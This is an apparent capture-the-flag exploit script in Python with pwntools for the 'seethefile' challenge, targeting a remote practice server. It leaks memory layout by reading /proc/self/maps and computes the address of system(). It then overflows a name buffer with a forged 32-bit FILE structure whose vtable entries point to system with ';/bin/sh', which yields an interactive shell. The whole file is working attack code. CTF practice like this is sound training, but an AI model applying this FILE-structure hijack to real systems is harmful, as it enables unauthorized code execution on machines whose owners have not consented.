from pwn import *
context(log_level='debug',arch='x86',terminal=['tmux','splitw','-h'])

# io=process("./seethefile")
io=remote("node4.buuoj.cn",29245)
libc=ELF("./libc_32.so.6")

def openn(cc):
    io.sendlineafter(b"Your choice :",b"1")
    io.sendlineafter(b"see :",cc)


def readd():
    io.sendlineafter(b"Your choice :",b"2")
    
def writee():
    io.sendlineafter(b"Your choice :",b"3")
    
def closes():
    io.sendlineafter(b"Your choice :",b"4")

def of():
    io.sendlineafter(b"Your choice :",b"5")


openn('/proc/self/maps')
readd()
writee()
# readd()
# writee()


io.recvuntil(b"heap]\n")

leak_addr=int(io.recv(8),16)+0x1000
print("leak_addr: "+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b"system"]

payload=cyclic(0x20)
payload+=p32(0x804B284)
payload+=p32(0xffffdfff)
payload+=b";/bin/sh"+b"\x00"*0x88
payload+=p32(0x804B284+0x98)
payload+=p32(sys_addr)*3

of()
io.recvuntil(b"name :")
io.sendline(payload)


io.interactive()